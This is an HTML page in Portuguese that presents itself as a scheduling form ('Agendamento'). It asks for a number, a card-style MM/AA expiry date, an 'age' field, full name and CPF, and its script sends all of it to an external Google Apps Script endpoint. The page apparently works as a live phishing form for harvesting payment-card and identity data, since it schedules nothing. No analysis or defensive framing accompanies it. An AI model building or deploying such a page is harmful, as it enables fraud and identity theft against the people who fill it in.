<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Agendamento</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f2f2f2;
}
.container {
    max-width: 420px;
    margin: auto;
    min-height: 100vh;
    background: #fff;
    padding: 20px;
}
.header {
    text-align: center;
    margin-bottom: 20px;
}
.label {
    font-size: 13px;
    font-weight: bold;
    margin-bottom: 5px;
    display: block;
}
input {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 15px;
    margin-bottom: 15px;
}
.row {
    display: flex;
    gap: 10px;
}
.botao {
    width: 100%;
    padding: 16px;
    background: #2962ff;
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: bold;
}
.sucesso {
    display: none;
    background: #d4edda;
    color: #155724;
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    margin-top: 15px;
}
</style>
</head>

<body>

<div class="container">

    <div class="header">
        <h2>Agendamento</h2>
        <p>Preencha os dados abaixo</p>
    </div>

    <label class="label">Número</label>
    <input id="numero" type="text" placeholder="Digite o número">

    <div class="row">
        <div style="flex:1">
            <label class="label">Validade (MM/AA)</label>
            <input id="validade" type="text" placeholder="MM/AA" maxlength="5">
        </div>
        <div style="flex:1">
            <label class="label">Idade</label>
            <input id="idade" type="text" placeholder="Ex: 25">
        </div>
    </div>

    <label class="label">Nome completo</label>
    <input id="nome" type="text" placeholder="Digite seu nome completo">

    <label class="label">CPF</label>
    <input id="cpf" type="text" placeholder="000.000.000-00">

    <button class="botao" onclick="enviar()">Confirmar</button>

    <div class="sucesso" id="msgSucesso">
        ✅ Dados enviados com sucesso!
    </div>

</div>

<script>
function enviar() {
    const data = {
        numero: document.getElementById("numero").value,
        validade: document.getElementById("validade").value,
        idade: document.getElementById("idade").value,
        nome: document.getElementById("nome").value,
        cpf: document.getElementById("cpf").value
    };

    if (!data.numero || !data.validade || !data.idade || !data.nome || !data.cpf) {
        alert("Preencha todos os campos.");
        return;
    }

    fetch("https://script.google.com/macros/s/AKfycbwHC2O0Kod0iZldji6GR3Qndj_zFBFLfM-H2Lu5zr1Q5LTLGpPRSwE4hDxWrUmnI15x/exec", {
        method: "POST",
        headers: {
            "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(data)
    })
    .then(() => {
        document.getElementById("msgSucesso").style.display = "block";
    })
    .catch(() => {
        alert("Erro ao enviar. Tente novamente.");
    });
}
</script>

</body>
</html>
